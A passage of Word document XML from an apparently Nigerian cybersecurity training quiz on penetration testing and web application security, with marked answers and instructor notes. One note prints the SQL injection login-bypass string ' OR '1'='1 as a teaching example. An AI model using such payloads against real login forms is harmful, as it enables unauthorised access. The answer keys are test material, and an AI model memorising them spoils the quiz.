        <w:t>B) Appendix (tool commands used)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Executive Summary (business risk overview in plain language)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Raw Nmap output tables</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Board members aren't reading nmap scans. Executive Summary = risk in ₦ and business impact language.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q85</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TryHackMe is used in cybersecurity training to:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Report cybercrime to Nigerian authorities</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Automatically scan client networks for vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Store and share malware samples for analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Practice offensive and defensive security skills in safe, legal, guided lab environments</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* TryHackMe = browser-based Kali, guided rooms, CTF-style learning. Free tier available. Highly recommended for students.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q86</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Lateral movement" in a penetration test means:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Moving files sideways between folders on a compromised machine</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Testing servers located in different geographic regions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>After initial compromise, moving to other systems within the same network</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Upgrading from user-level access to administrator access</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Vertical = privilege escalation. Lateral = spreading across network. Together = "living off the land." MITRE ATT&amp;CK TA0008.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q87</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A penetration tester finds a critical vulnerability but the client's rules of engagement say "do not exploit any live production systems." The correct action is:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Exploit it anyway to prove the severity to the client</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Ignore it and do not include it in the report</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Exploit it on a staging system only and document both findings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Document the vulnerability, assess severity, and report it without exploiting the production system</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CRITICAL] · *Time:* 60 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Rules of engagement are legally binding. Violating them exposes the tester to criminal liability regardless of good intentions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q88</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Post-exploitation activities in a penetration test include:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Writing the final report</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Scanning for open ports on new targets</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Maintaining access, pivoting to other systems, and assessing the "blast radius" of the initial compromise</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Removing all installed tools and restoring systems</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Post-exploitation = what can an attacker do WITH the access they gained? Data exfiltration? Lateral movement? Persistence?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q89</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Kali Linux is the industry-standard penetration testing OS because:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) It is the only Linux distribution that supports wireless networking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) It cannot be used for malicious purposes — only authorised testing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>It comes pre-installed with hundreds of security tools including Nmap, Metasploit, Wireshark, and Burp Suite</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) It is free and open-source (all Linux distributions are free)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Kali ≠ safety guarantee. The tool is neutral — authorisation and ethics determine legality.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q90</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A client hires a penetration tester in Lagos to assess their banking application. During testing, the tester discovers a SQL injection vulnerability that exposes customer account numbers. The client's data includes BVN records. Under NDPA 2023, what additional obligation exists BEYOND fixing the vulnerability?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) None — the breach was discovered by an authorised tester, not an attacker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Report immediately to the Cybercrimes Unit of the Nigeria Police Force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>If personal data was accessed or exposed, even during authorised testing, the organisation may need to notify the NDPC within 72 hours of determining a breach occurred</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Publish the vulnerability details to warn other Nigerian banks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* The grey area of authorised testing + personal data exposure. NDPA 2023 doesn't exempt authorised testers from notification obligations if personal data was processed. Sophisticated legal/ethical dimension — excellent discussion starter.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 7 [ADVANCED]: Web Application Security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Level: Advanced | Questions: Q91–Q105*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q91</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What does OWASP stand for?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Open Web Application Security Protocol</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Online Web Audit and Security Platform</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Open Web Application Security Project</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Operational Web Application Standards Policy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* OWASP = non-profit, produces the Top 10 web vulnerability list, free tools (ZAP), testing guides.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q92</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the #1 vulnerability on the OWASP Top 10 (2021)?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Injection (SQL Injection)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Cross-Site Scripting (XSS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Insecure Deserialization</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Broken Access Control</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* A01:2021 Broken Access Control — rose to #1 in 2021 from #5 in 2017. Users accessing other users' data.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q93</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SQL Injection works by:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Sending too many database requests to crash the server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Stealing database files from the server's hard drive</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Inserting malicious SQL code into input fields that gets executed by the database</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Using brute force to guess database administrator passwords</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">*Instructor Note:* Classic: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="0F772A"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>' OR '1'='1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> bypasses login. SQLMap automates detection. Root cause: user input concatenated into SQL query.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q94</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which coding practice BEST prevents SQL injection?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Encrypting the database with AES-256</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Using a strong database administrator password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Using parameterised queries (prepared statements)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Blocking all special characters at the web server firewall</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Parameterised queries separate code from data — the DB never executes user input as SQL code. WAF is defence-in-depth, not a substitute.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q95</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cross-Site Scripting (XSS) allows an attacker to:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Inject malicious SQL into a database query</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Forge HTTP requests from a victim's browser to a trusted site</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Inject malicious JavaScript that executes in other users' browsers</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Intercept and decrypt HTTPS traffic between client and server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* XSS = JavaScript injection into a web page. Session cookie theft, keylogging, phishing overlays — all possible.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q96</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the difference between stored XSS and reflected XSS?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Stored XSS targets databases; reflected XSS targets web servers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Stored XSS persists in the database (affects all visitors); reflected XSS is returned immediately in the response (requires tricking one user)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Reflected XSS is more dangerous because it affects all users</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) There is no practical difference — both work the same way</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Stored = worst. Injected into comment/forum post, served to everyone. Reflected = URL crafted to trick one victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q97</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IDOR (Insecure Direct Object Reference) is an example of which OWASP Top 10 category?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) A03: Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) A05: Security Misconfiguration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) A07: Identification and Authentication Failures</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A01: Broken Access Control</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* IDOR = changing URL parameter (user_id=123 → user_id=124) to access another user's data. Extremely common in Nigerian fintech APIs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q98</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What does a Content Security Policy (CSP) header do?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Caches web content to improve page load speed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Encrypts cookies sent between browser and server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Restricts which sources of scripts, images, and other resources the browser is allowed to load</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Compresses HTTP responses to save bandwidth</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">*Instructor Note:* CSP mitigates XSS by allowlisting trusted script sources. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="0F772A"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Content-Security-Policy: default-src 'self'</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — only load from own domain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q99</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Burp Suite's "Repeater" tool is used to:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Automatically scan a web application for all OWASP Top 10 vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
